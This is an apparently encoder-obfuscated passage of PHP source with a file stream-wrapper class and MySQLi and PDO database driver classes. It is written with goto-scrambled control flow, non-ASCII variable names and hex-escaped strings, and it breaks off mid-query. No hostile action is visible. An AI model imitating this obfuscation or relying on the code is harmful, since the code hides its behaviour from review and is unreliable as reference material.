goto BÙôŞĞ¢œÓ; a¹ß°¯’Î: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$eÊÍ ê¾])) { self::$_chunkBuffer[$eÊÍ ê¾] = array(); } goto f–Œîëñƒ; A³›µ’‹Úæ: $this->info = $this->info($eÊÍ ê¾); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[îÖ][75]]; goto a¹ß°¯’Î; BÙôŞĞ¢œÓ: } function stream_read($a…×»˜£ÔÀ) { $Eˆ„æŠÄ¹Ù = $this->fileSubstr($this->pose, $a…×»˜£ÔÀ); $this->pose += strlen($Eˆ„æŠÄ¹Ù); return $Eˆ„æŠÄ¹Ù; } public function stream_tell() { return $this->pose; } public function stream_seek($f‰•éîŠ÷¼, $fÆÎÂã® Ñ) { $a®±¨ê‡Ø¿ =& $_SERVER[îÖ]; if ($fÆÎÂã® Ñ == SEEK_SET) { $this->pose = $f‰•éîŠ÷¼; } else { if ($fÆÎÂã® Ñ == SEEK_CUR) { $this->pose += $f‰•éîŠ÷¼; } else { if ($fÆÎÂã® Ñ == SEEK_END) { $this->pose = $this->info[$a®±¨ê‡Ø¿[77]] + intval($f‰•éîŠ÷¼); } } } if ($f‰•éîŠ÷¼ < 0) { $this->pose = $this->info[$a®±¨ê‡Ø¿[77]] + $f‰•éîŠ÷¼; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[îÖ][77]]; } public function stream_close() { return !0; } public function url_stat($a¬­‚¥ßÊ, $dçğ¾Ùò²é) { $FÆÆÎ‹èà =& $_SERVER[îÖ]; $CË¸ÃìÚœ = $this->info($a¬­‚¥ßÊ); return array($FÆÆÎ‹èà[1284] => 0, $FÆÆÎ‹èà[1285] => 0, $FÆÆÎ‹èà[12] => 32768 + 511, $FÆÆÎ‹èà[1286] => 0, $FÆÆÎ‹èà[1287] => 0, $FÆÆÎ‹èà[1288] => 0, $FÆÆÎ‹èà[1289] => 0, $FÆÆÎ‹èà[77] => $CË¸ÃìÚœ[$FÆÆÎ‹èà[77]], $FÆÆÎ‹èà[1290] => $CË¸ÃìÚœ[$FÆÆÎ‹èà[1162]], $FÆÆÎ‹èà[1248] => $CË¸ÃìÚœ[$FÆÆÎ‹èà[107]], $FÆÆÎ‹èà[1247] => $CË¸ÃìÚœ[$FÆÆÎ‹èà[187]], $FÆÆÎ‹èà[1291] => 0, $FÆÆÎ‹èà[1292] => 0); } static $fileInfo = array(); public function info($BÔŞä­­³Ê) { $e‡Â£÷±İò = $_SERVER[îÖ][1293]; if (isset(self::$fileInfo[$BÔŞä­­³Ê])) { return self::$fileInfo[$BÔŞä­­³Ê]; } if (substr($BÔŞä­­³Ê, 0, strlen($e‡Â£÷±İò)) != $e‡Â£÷±İò) { return !1; } self::$fileInfo[$BÔŞä­­³Ê] = IO::info(substr($BÔŞä­­³Ê, strlen($e‡Â£÷±İò))); return self::$fileInfo[$BÔŞä­­³Ê]; } public static function read($còÓ¨ˆøäº, $BÒ¾è‡†åß, $f ®Ÿ”•‹ò) { goto Fò„Âˆ¢‘; Fò„Âˆ¢‘: $Cöø¨–ŒöÀ =& $_SERVER[îÖ]; $D‡Øäá…³ = fopen($còÓ¨ˆøäº, $Cöø¨–ŒöÀ[1164]); if (!$D‡Øäá…³) { return $Cöø¨–ŒöÀ[33]; } goto a„è†˜ß³; EµøâÈö×Ÿ: $FµáÒŒ£Çİ = 0; while ($FµáÒŒ£Çİ < $f ®Ÿ”•‹ò) { $e“æÆÇ•ùÎ = min($aì—Üôšì¹, $f ®Ÿ”•‹ò - $FµáÒŒ£Çİ); $Cãˆ†õ•ê› .= fread($D‡Øäá…³, $e“æÆÇ•ùÎ); $FµáÒŒ£Çİ += $e“æÆÇ•ùÎ; } fclose($D‡Øäá…³); goto a•ùˆØ³ï˜; a•ùˆØ³ï˜: return $Cãˆ†õ•ê›; goto Dí÷È•¶·í; a„è†˜ß³: $aì—Üôšì¹ = 8192; fseek($D‡Øäá…³, $BÒ¾è‡†åß, SEEK_SET); $Cãˆ†õ•ê› = $Cöø¨–ŒöÀ[33]; goto EµøâÈö×Ÿ; Dí÷È•¶·í: } public function fileSubstr($CÒËôĞµ, $FÊ‚ğì÷Ø) { goto Dò¾§À‚Â‡; Dò¾§À‚Â‡: $EÕß…Èç”¥ =& $_SERVER[îÖ]; $dğ„ôÁïÌ» = $this->info[$EÕß…Èç”¥[77]]; $bÉ©Ø…®éŠ = $CÒËôĞµ; goto aˆø‹šùö; b²‹Ç¯ÜĞÓ: $dŠ¿±ê¥¸¨ = ceil(($CÒËôĞµ + $FÊ‚ğì÷Ø) / $fóÛ¯óçÙ) * $fóÛ¯óçÙ - $FÆ„­ìé÷; $E—ÑõéÇÊé = IO::fileSubstr($this->path, $FÆ„­ìé÷, $dŠ¿±ê¥¸¨); $f†ŞšÜ˜ô[$FÆ„­ìé÷ . $EÕß…Èç”¥[33]] = $E—ÑõéÇÊé; goto eÔƒ–×ÔÓ; D“Ô†‡ó: $fóÛ¯óçÙ = 64 * 1024; $f†ŞšÜ˜ô =& self::$_chunkBuffer[$this->path]; if (!$f†ŞšÜ˜ô) { $f†ŞšÜ˜ô = array(); } goto E¾‘³¥ò”Ô; E¾‘³¥ò”Ô: $A†©—‚áÏ“ = 0; $fÚ½ÀĞÓÆì = 0; $Aç¬÷‚È¥ = $EÕß…Èç”¥[33]; goto a³á«²ÄÄù; a³á«²ÄÄù: foreach ($f†ŞšÜ˜ô as $A†©—‚áÏ“ => $Aç¬÷‚È¥) { $A†©—‚áÏ“ = intval($A†©—‚áÏ“); $fÚ½ÀĞÓÆì = $A†©—‚áÏ“ + strlen($Aç¬÷‚È¥); if ($CÒËôĞµ >= $fÚ½ÀĞÓÆì) { continue; } if ($CÒËôĞµ >= $A†©—‚áÏ“ && $CÒËôĞµ + $FÊ‚ğì÷Ø <= $fÚ½ÀĞÓÆì) { return substr($Aç¬÷‚È¥, $CÒËôĞµ - $A†©—‚áÏ“, $FÊ‚ğì÷Ø); } break; } if (count($f†ŞšÜ˜ô) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($EÕß…Èç”¥[1294], $EÕß…Èç”¥[1295] . count($f†ŞšÜ˜ô) . "\x3b\x73\x74\x61\162\164\x3d{$CÒËôĞµ}\54\x6c\145\156\x67\164\x68\75{$FÊ‚ğì÷Ø}\73\160\157\x73\x65\72{$A†©—‚áÏ“}\x7e{$fÚ½ÀĞÓÆì}"); throw new Exception($EÕß…Èç”¥[1296]); } $FÆ„­ìé÷ = intval($CÒËôĞµ / $fóÛ¯óçÙ) * $fóÛ¯óçÙ; goto b²‹Ç¯ÜĞÓ; DĞ§ƒ­‘º–: if ($CÒËôĞµ + $FÊ‚ğì÷Ø > $dğ„ôÁïÌ») { $FÊ‚ğì÷Ø = $dğ„ôÁïÌ» - $CÒËôĞµ; } if ($FÊ‚ğì÷Ø <= 0) { return $EÕß…Èç”¥[33]; } if ($CÒËôĞµ < 0 || $CÒËôĞµ >= $dğ„ôÁïÌ» || $FÊ‚ğì÷Ø <= 0 || $FÊ‚ğì÷Ø > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\151\154\145\x52\x65\141\x64\40\145\162\162\157\162\41\x20\x73\x74\x61\162\164\75{$CÒËôĞµ}\73\x6c\145\x6e\147\164\x68\75{$FÊ‚ğì÷Ø}\73\40\x73\151\172\x65\x3d{$dğ„ôÁïÌ»}\x3b"); } goto D“Ô†‡ó; aˆø‹šùö: $b‹ñ™“›çè = $FÊ‚ğì÷Ø; if ($CÒËôĞµ < 0) { $CÒËôĞµ = $dğ„ôÁïÌ» + $CÒËôĞµ; } if ($FÊ‚ğì÷Ø === !1) { $FÊ‚ğì÷Ø = $dğ„ôÁïÌ» - $CÒËôĞµ; } goto DĞ§ƒ­‘º–; eÔƒ–×ÔÓ: ksort($f†ŞšÜ˜ô); $bÖÙ›ØìÕ¾ = substr($E—ÑõéÇÊé, $CÒËôĞµ - $FÆ„­ìé÷, $FÊ‚ğì÷Ø); return $bÖÙ›ØìÕ¾; goto A­ŸÇÈØÂ†; A­ŸÇÈØÂ†: } private function log($D•êèëÛ½ˆ, $EŠ‘šá¥’Å) { $E»¡¢‹‘œŒ =& $_SERVER[îÖ]; $Dò£áĞÚòï = timeFloat() - $this->timeStart; write_log(sprintf($E»¡¢‹‘œŒ[1297], $D•êèëÛ½ˆ, $this->info[$E»¡¢‹‘œŒ[28]], $Dò£áĞÚòï, $EŠ‘šá¥’Å), $E»¡¢‹‘œŒ[1213]); } } goto CËëŞ²ÚØ; cÀ¯”ÊÙªË: class DbMysqli extends Db { public function __construct($Fô’âÒ¸Ï = '') { $dµøƒ¡¶Ş =& $_SERVER[îÖ]; if (!extension_loaded($dµøƒ¡¶Ş[726])) { think_exception(think_lang($dµøƒ¡¶Ş[10]) . $dµøƒ¡¶Ş[819]); } if (!empty($Fô’âÒ¸Ï)) { $this->config = $Fô’âÒ¸Ï; if (empty($this->config[$dµøƒ¡¶Ş[13]])) { $this->config[$dµøƒ¡¶Ş[13]] = $dµøƒ¡¶Ş[33]; } } } public function connect($D¾¨ºŠÀ· = '', $BƒŠ¸Ÿ¬ØÚ = 0) { $eòö¿É— =& $_SERVER[îÖ]; if (!isset($this->linkID[$BƒŠ¸Ÿ¬ØÚ])) { goto DÌŸ†Ò ; DÌŸ†Ò : if (empty($D¾¨ºŠÀ·)) { $D¾¨ºŠÀ· = $this->config; } $this->linkID[$BƒŠ¸Ÿ¬ØÚ] = new mysqli($D¾¨ºŠÀ·[$eòö¿É—[793]], $D¾¨ºŠÀ·[$eòö¿É—[795]], $D¾¨ºŠÀ·[$eòö¿É—[796]], $D¾¨ºŠÀ·[$eòö¿É—[17]], $D¾¨ºŠÀ·[$eòö¿É—[794]] ? intval($D¾¨ºŠÀ·[$eòö¿É—[794]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto A¿Ë—¢”ˆ³; A¿Ë—¢”ˆ³: $c‹øš·¿¾¥ = $this->linkID[$BƒŠ¸Ÿ¬ØÚ]->server_version; $this->linkID[$BƒŠ¸Ÿ¬ØÚ]->query($eòö¿É—[797] . think_config($eòö¿É—[798]) . $eòö¿É—[55]); if ($c‹øš·¿¾¥ > $eòö¿É—[799]) { $this->linkID[$BƒŠ¸Ÿ¬ØÚ]->query($eòö¿É—[800]); } goto e—¾Õƒø«; e—¾Õƒø«: $this->connected = !0; if (1 != think_config($eòö¿É—[18])) { unset($this->config); } goto c•ŞÒ¶Êœ; c•ŞÒ¶Êœ: } return $this->linkID[$BƒŠ¸Ÿ¬ØÚ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Dá˜ñëÖ®) { goto D««ÏŠ ‰è; D««ÏŠ ‰è: $bîªÓ²íÛ… =& $_SERVER[îÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c°Ÿ“œÛä; d·Ö×ÁÓ–ø: think_status($bîªÓ²íÛ…[20]); $this->queryID = $this->_linkID->query($Dá˜ñëÖ®); if ($this->_linkID->more_results()) { while (($cÈ¬›áì×œ = $this->_linkID->next_result()) != NULL) { $cÈ¬›áì×œ->free_result(); } } goto f“Ãä¹—½ä; f“Ãä¹—½ä: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto b¶†µ‘Ş—ó; c°Ÿ“œÛä: $this->queryStr = $Dá˜ñëÖ®; if ($this->queryID) { $this->free(); } think_action_status($bîªÓ²íÛ…[19], 1); goto d·Ö×ÁÓ–ø; b¶†µ‘Ş—ó: } public function execute($D‡Š¬À) { goto Eªì…°¼; ašĞ•Ò‡óê: think_status($E¥ÌëÃË¢½[20]); $Bõô·Ç·°¬ = $this->_linkID->query($D‡Š¬À); $this->debug(); goto F¸ÑëÎ“Á; Eªì…°¼: $E¥ÌëÃË¢½ =& $_SERVER[îÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DÓŞ³¸Æ§; DÓŞ³¸Æ§: $this->queryStr = $D‡Š¬À; if ($this->queryID) { $this->free(); } think_action_status($E¥ÌëÃË¢½[21], 1); goto ašĞ•Ò‡óê; F¸ÑëÎ“Á: if (!1 === $Bõô·Ç·°¬) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aé³÷À§‡¥; aé³÷À§‡¥: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Dœ¤Í©™ô® = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Dœ¤Í©™ô®) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E¯„Òâ¯ææ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$E¯„Òâ¯ææ) { $this->error(); return !1; } } return !0; } private function getAll() { $e‰ªĞœ¾‹Ì = array(); if ($this->numRows > 0) { for ($FÍî“Œê£ = 0; $FÍî“Œê£ < $this->numRows; $FÍî“Œê£++) { $e‰ªĞœ¾‹Ì[$FÍî“Œê£] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $e‰ªĞœ¾‹Ì; } public function getFields($b¯ƒô·¨Ğ) { $eÙ…‚æé­ =& $_SERVER[îÖ]; $Cµ’äòªó• = $this->query($eÙ…‚æé­[804] . $this->parseKey($b¯ƒô·¨Ğ)); $DÅ´„¬ÅÎ™ = array(); if ($Cµ’äòªó•) { foreach ($Cµ’äòªó• as $EêÑìË¯Óæ => $EŒÕç¬Ôà) { $DÅ´„¬ÅÎ™[$EŒÕç¬Ôà[$eÙ…‚æé­[27]]] = array($eÙ…‚æé­[28] => $EŒÕç¬Ôà[$eÙ…‚æé­[27]], $eÙ…‚æé­[29] => $EŒÕç¬Ôà[$eÙ…‚æé­[30]], $eÙ…‚æé­[31] => (bool) ($EŒÕç¬Ôà[$eÙ…‚æé­[32]] === $eÙ…‚æé­[33]), $eÙ…‚æé­[34] => $EŒÕç¬Ôà[$eÙ…‚æé­[35]], $eÙ…‚æé­[36] => strtolower($EŒÕç¬Ôà[$eÙ…‚æé­[37]]) == $eÙ…‚æé­[38], $eÙ…‚æé­[39] => strtolower($EŒÕç¬Ôà[$eÙ…‚æé­[40]]) == $eÙ…‚æé­[41]); } } return $DÅ´„¬ÅÎ™; } public function getTables($d†‚°í·Î = '') { $CŒÉí–õè =& $_SERVER[îÖ]; $aòÇ“ŠŠêË = !empty($d†‚°í·Î) ? $CŒÉí–õè[806] . $d†‚°í·Î : $CŒÉí–õè[807]; $eÏ§¨ì–Ë° = $this->query($aòÇ“ŠŠêË); $dø Æ£˜İ³ = array(); if ($eÏ§¨ì–Ë°) { foreach ($eÏ§¨ì–Ë° as $Bá”Ú²É¸ => $BØä×š˜Ï) { $dø Æ£˜İ³[$Bá”Ú²É¸] = current($BØä×š˜Ï); } } return $dø Æ£˜İ³; } public function replace($Eˆè¡Ã…Æ„, $D‡Å½Ÿ• = array()) { $Dò†Œïµ–ã =& $_SERVER[îÖ]; foreach ($Eˆè¡Ã…Æ„ as $BºêÊŸÆÒ => $cêÓê®ğİ) { $d•¥¼¬‹Üõ = $this->parseValue($cêÓê®ğİ); if (is_scalar($d•¥¼¬‹Üõ)) { $aº¦±ïÍî®[] = $d•¥¼¬‹Üõ; $CÌçùÕŠÖØ[] = $this->parseKey($BºêÊŸÆÒ); } } $Eª¨Ñ¤Ÿ… = $Dò†Œïµ–ã[808] . $this->parseTable($D‡Å½Ÿ•[$Dò†Œïµ–ã[267]]) . $Dò†Œïµ–ã[809] . implode($Dò†Œïµ–ã[47], $CÌçùÕŠÖØ) . $Dò†Œïµ–ã[810] . implode($Dò†Œïµ–ã[47], $aº¦±ïÍî®) . $Dò†Œïµ–ã[811]; return $this->execute($Eª¨Ñ¤Ÿ…); } public function insertAll($aÈ¸ÒÈÎÖ, $C‡Âö”Ô± = array(), $FŒğ¢»†¯Ê = false) { goto FÕ·‰õèº; FÕ·‰õèº: $CˆçÑó­Ñá =& $_SERVER[îÖ]; if (!is_array($aÈ¸ÒÈÎÖ[0])) { return !1; } $BÙ¢‘ç†Õ÷ = array_keys($aÈ¸ÒÈÎÖ[0]); goto F‹İÔ˜ö‘»; D¼š»¼‚°: $Cø‘ºßäñ = ($FŒğ¢»†¯Ê ? $CˆçÑó­Ñá[813] : $CˆçÑó­Ñá[814]) . $CˆçÑó­Ñá[815] . $this->parseTable($C‡Âö”Ô±[$CˆçÑó­Ñá[267]]) . $CˆçÑó­Ñá[809] . implode($CˆçÑó­Ñá[47], $BÙ¢‘ç†Õ÷) . $CˆçÑó­Ñá[816] . implode($CˆçÑó­Ñá[47], $aÇ™ºèĞŸˆ); return $this->execute($Cø‘ºßäñ); goto fŠ¾©©îÓ¸; F‹İÔ˜ö‘»: $aÇ™ºèĞŸˆ = array(); foreach ($aÈ¸ÒÈÎÖ as $føÓä´ø¢ª) { $få‚å™ì = array(); foreach ($føÓä´ø¢ª as $F×ºõâ—´ç => $eİ¨²ãğ‡·) { $eİ¨²ãğ‡· = $this->parseValue($eİ¨²ãğ‡·); if (is_scalar($eİ¨²ãğ‡·)) { $få‚å™ì[] = $eİ¨²ãğ‡·; } } $aÇ™ºèĞŸˆ[] = $CˆçÑó­Ñá[248] . implode($CˆçÑó­Ñá[47], $få‚å™ì) . $CˆçÑó­Ñá[811]; } array_walk($BÙ¢‘ç†Õ÷, array($this, $CˆçÑó­Ñá[812])); goto D¼š»¼‚°; fŠ¾©©îÓ¸: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F»À»„ÙÛ… =& $_SERVER[îÖ]; $this->error = $this->_linkID->errno . $F»À»„ÙÛ…[4] . $this->_linkID->error; if ($F»À»„ÙÛ…[33] != $this->queryStr) { $this->error .= LNG($F»À»„ÙÛ…[45]) . $this->queryStr; } think_trace($this->error, $F»À»„ÙÛ…[33], $F»À»„ÙÛ…[46]); return $this->error; } public function escapeString($fà‹½¸¡®ƒ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($fà‹½¸¡®ƒ); } else { return addslashes($fà‹½¸¡®ƒ); } } public function parseKey(&$dÖÜ–Ñ…ª, $eœ×Í¢‹¡¿ = true) { $aÂÖØ×™Î =& $_SERVER[îÖ]; if ($eœ×Í¢‹¡¿) { $dÖÜ–Ñ…ª = $this->parseKeyCheck($dÖÜ–Ñ…ª); } if ($dÖÜ–Ñ…ª != $aÂÖØ×™Î[176] && !preg_match($aÂÖØ×™Î[817], $dÖÜ–Ñ…ª)) { $dÖÜ–Ñ…ª = $aÂÖØ×™Î[818] . trim($dÖÜ–Ñ…ª, $aÂÖØ×™Î[818]) . $aÂÖØ×™Î[818]; } return $dÖÜ–Ñ…ª; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($EĞÚ×Š‰½¾ = '') { $aè±ñ†Æ”Ô =& $_SERVER[îÖ]; if (!class_exists($aè±ñ†Æ”Ô[820])) { think_exception(think_lang($aè±ñ†Æ”Ô[10]) . $aè±ñ†Æ”Ô[821]); } if (!empty($EĞÚ×Š‰½¾)) { $this->config = $EĞÚ×Š‰½¾; if (empty($this->config[$aè±ñ†Æ”Ô[13]])) { $this->config[$aè±ñ†Æ”Ô[13]] = array(); } } } public function connect($F¶‰ÁÉ×ƒ¤ = '', $aá¼«¸àã‰ = 0) { $dãò³æªĞ =& $_SERVER[îÖ]; if (!isset($this->linkID[$aá¼«¸àã‰])) { goto A‡²²­‘ø; FÃÍ„·È­‹: $this->linkID[$aá¼«¸àã‰]->exec($dãò³æªĞ[831] . think_config($dãò³æªĞ[798])); $this->connected = !0; if (1 != think_config($dãò³æªĞ[18])) { unset($this->config); } goto DÒ•¨Ç¬Å¯; aÒÆœ—½Ñ¤: $this->dbType = $this->_getDsnType($F¶‰ÁÉ×ƒ¤[$dãò³æªĞ[822]]); if (in_array($this->dbType, array($dãò³æªĞ[823], $dãò³æªĞ[824], $dãò³æªĞ[825], $dãò³æªĞ[826]))) { think_exception($dãò³æªĞ[827] . $this->dbType . $dãò³æªĞ[828] . $this->dbType . $dãò³æªĞ[829]); } if (!$this->linkID[$aá¼«¸àã‰]) { think_exception($dãò³æªĞ[830]); } goto FÃÍ„·È­‹; A‡²²­‘ø: if (empty($F¶‰ÁÉ×ƒ¤)) { $F¶‰ÁÉ×ƒ¤ = $this->config; } if ($this->pconnect) { $F¶‰ÁÉ×ƒ¤[$dãò³æªĞ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$aá¼«¸àã‰] = new PDO($F¶‰ÁÉ×ƒ¤[$dãò³æªĞ[822]], $F¶‰ÁÉ×ƒ¤[$dãò³æªĞ[795]], $F¶‰ÁÉ×ƒ¤[$dãò³æªĞ[796]], $F¶‰ÁÉ×ƒ¤[$dãò³æªĞ[13]]); } catch (PDOException $bÇßæˆ¦ˆó) { think_exception($bÇßæˆ¦ˆó->getMessage()); } goto aÒÆœ—½Ñ¤; DÒ•¨Ç¬Å¯: } return $this->linkID[$aá¼«¸àã‰]; } public function free() { $this->PDOStatement = null; } public function query($CÊÃ„…Âİ, $aÂ¶¼È§ëÇ = array()) { goto D¢¼ÙØÂëË; BŒ ˜ÓøÚ: $this->queryStr = $CÊÃ„…Âİ; if (!empty($aÂ¶¼È§ëÇ)) { $this->queryStr .= $Cñïº…‡çÖ[832] . print_r($aÂ¶¼È§ëÇ, !0) . $Cñïº…‡çÖ[833]; } if (!empty($this->PDOStatement)) { $this->free(); } goto F”£äìÒ; bøùù¢µ¾ê: if (!1 === $B‹¸šÁ®ñŠ) { $this->error(); return !1; } else { return $this->getAll(); } goto eï‹É¾¬’´; D¢¼ÙØÂëË: $Cñïº…‡çÖ =& $_SERVER[îÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BŒ ˜ÓøÚ; EÃƒòÑà£¨: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $B‹¸šÁ®ñŠ = $this->PDOStatement->execute($aÂ¶¼È§ëÇ); $this->debug(); goto bøùù¢µ¾ê; F”£äìÒ: think_action_status($Cñïº…‡çÖ[19], 1); think_status($Cñïº…‡çÖ[20]); $this->PDOStatement = $this->_linkID->prepare($CÊÃ„…Âİ); goto EÃƒòÑà£¨; eï‹É¾¬’´: } public function execute($Aù†Îò¥†, $DóäõÈŞ™‘ = array()) { goto CÇ†¦Ì¯ˆ·; f®–Ğ…å…: $this->queryStr = $Aù†Îò¥†; if (!empty($DóäõÈŞ™‘)) { $this->queryStr .= $cè”øàò‘Õ[832] . print_r($DóäõÈŞ™‘, !0) . $cè”øàò‘Õ[833]; } $B¯îÖù©‰ = !1; goto Cè¦ËÆÍ¹; CÇ†¦Ì¯ˆ·: $cè”øàò‘Õ =& $_SERVER[îÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f®–Ğ…å…; Cè¦ËÆÍ¹: if ($this->dbType == $cè”øàò‘Õ[826]) { if (preg_match($cè”øàò‘Õ[834], $this->queryStr, $CŠ…öˆãÃ)) { $this->table = think_config($cè”øàò‘Õ[835]) . str_ireplace(think_config($cè”øàò‘Õ[836]), $cè”øàò‘Õ[361], $CŠ…öˆãÃ[2]); $B¯îÖù©‰ = (bool) $this->query($cè”øàò‘Õ[837] . strtoupper($this->table) . $cè”øàò‘Õ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($cè”øàò‘Õ[21], 1); goto F¥â®–å­; F¥â®–å­: think_status($cè”øàò‘Õ[20]); $this->PDOStatement = $this->_linkID->prepare($Aù†Îò¥†); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto a˜ˆ…œ´ø; a˜ˆ…œ´ø: $f«Ñ…ñ©›¥ = $this->PDOStatement->execute($DóäõÈŞ™‘); $this->debug(); if (!1 === $f«Ñ…ñ©›¥) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($B¯îÖù©‰ || preg_match($cè”øàò‘Õ[838], $Aù†Îò¥†)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto bÜÂ“›Øø; bÜÂ“›Øø: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Aï¨ĞÊ¨—• = $this->_linkID->commit(); $this->transTimes = 0; if (!$Aï¨ĞÊ¨—•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bÂµ¤è¶ô = $this->_linkID->rollback(); $this->transTimes = 0; if (!$bÂµ¤è¶ô) { $this->error(); return !1; } } return !0; } private function getAll() { $EŠà¼–¸¾¯ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($EŠà¼–¸¾¯); return $EŠà¼–¸¾¯; } public function getFields($E×¢§ŒÃÜŞ) { goto EÁ…±Æáô‚; CŸµÏï±Ç„: $f¬Ô¿ğáõÔ = $this->query($E·¡šÅ¡); $féĞéã¥± = array(); if ($f¬Ô¿ğáõÔ) { foreach ($f¬Ô¿ğáõÔ as $FŸ°Šéøï => $a”ŠïÒÃÌØ) { $a”ŠïÒÃÌØ = array_change_key_case($a”ŠïÒÃÌØ); $a”ŠïÒÃÌØ[$Fƒİß¬¥è[28]] = isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[28]]) ? $a”ŠïÒÃÌØ[$Fƒİß¬¥è[28]] : $Fƒİß¬¥è[361]; $a”ŠïÒÃÌØ[$Fƒİß¬¥è[29]] = isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[29]]) ? $a”ŠïÒÃÌØ[$Fƒİß¬¥è[29]] : $Fƒİß¬¥è[361]; $F¤ëÛ›ãö = isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[261]]) ? $a”ŠïÒÃÌØ[$Fƒİß¬¥è[261]] : $a”ŠïÒÃÌØ[$Fƒİß¬¥è[28]]; $féĞéã¥±[$F¤ëÛ›ãö] = array($Fƒİß¬¥è[28] => $F¤ëÛ›ãö, $Fƒİß¬¥è[29] => $a”ŠïÒÃÌØ[$Fƒİß¬¥è[29]], $Fƒİß¬¥è[31] => (bool) (isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[99]]) && $a”ŠïÒÃÌØ[$Fƒİß¬¥è[99]] === $Fƒİß¬¥è[33] || isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[31]]) && $a”ŠïÒÃÌØ[$Fƒİß¬¥è[31]] === $Fƒİß¬¥è[33]), $Fƒİß¬¥è[34] => isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[34]]) ? $a”ŠïÒÃÌØ[$Fƒİß¬¥è[34]] : (isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[53]]) ? $a”ŠïÒÃÌØ[$Fƒİß¬¥è[53]] : $Fƒİß¬¥è[361]), $Fƒİß¬¥è[36] => isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[89]]) ? strtolower($a”ŠïÒÃÌØ[$Fƒİß¬¥è[89]]) == $Fƒİß¬¥è[38] : (isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[54]]) ? $a”ŠïÒÃÌØ[$Fƒİß¬¥è[54]] : !1), $Fƒİß¬¥è[39] => isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[855]]) ? strtolower($a”ŠïÒÃÌØ[$Fƒİß¬¥è[855]]) == $Fƒİß¬¥è[41] : (isset($a”ŠïÒÃÌØ[$Fƒİß¬¥è[89]]) ? $a”ŠïÒÃÌØ[$Fƒİß¬¥è[89]] : !1)); } } goto c¾êÁŒ¾; EÁ…±Æáô‚: $Fƒİß¬¥è =& $_SERVER[îÖ]; $this->initConnect(!0); if (think_config($Fƒİß¬¥è[839])) { $E·¡šÅ¡ = str_replace($Fƒİß¬¥è[840], $E×¢§ŒÃÜŞ, think_config($Fƒİß¬¥è[839])); } else { switch ($this->dbType) { case $Fƒİß¬¥è[823]: case $Fƒİß¬¥è[841]: $E·¡šÅ¡ = "\x53\105\114\105\103\x54\x20\x20\40\x63\157\154\x75\155\x6e\x5f\x6e\141\x6d\x65\40\x61\x73\40\x27\116\141\x6d\145\x27\x2c\40\40\x20\144\141\164\141\x5f\164\171\x70\145\x20\x61\x73\40\47\x54\x79\160\x65\47\x2c\x20\x20\x20\143\157\x6c\165\x6d\x6e\x5f\144\x65\x66\x61\165\154\164\x20\x61\163\x20\x27\104\x65\x66\x61\x75\154\164\x27\54\40\x20\40\x69\163\137\x6e\165\x6c\x6c\141\x62\x6c\x65\x20\141\x73\x20\47\x4e\165\154\x6c\x27\xa\x9\11\106\122\x4f\115\11\x69\156\x66\157\162\155\x61\164\x69\157\156\137\163\x63\150\145\155\141\56\x74\x61\142\154\145\163\x20\101\x53\40\164\xa\11\x9\x4a\x4f\111\x4e\x9\151\156\x66\157\162\x6d\x61\x74\x69\157\x6e\137\x73\x63\x68\x65\x6d\141\56\143\157\x6c\165\155\156\x73\x20\x41\x53\x20\x63\12\x9\x9\x4f\116\40\x20\164\x2e\164\x61\x62\154\145\x5f\143\x61\164\141\154\157\147\40\x3d\40\143\x2e\x74\x61\142\154\x65\x5f\x63\x61\x74\141\154\x6f\x67\12\11\11\101\x4e\104\40\164\56\164\141\x62\154\x65\x5f\x73\143\150\x65\x6d\x61\x20\75\x20\x63\56\x74\x61\142\154\x65\137\163\143\x68\145\155\x61\12\x9\11\101\x4e\104\40\164\x2e\164\141\142\x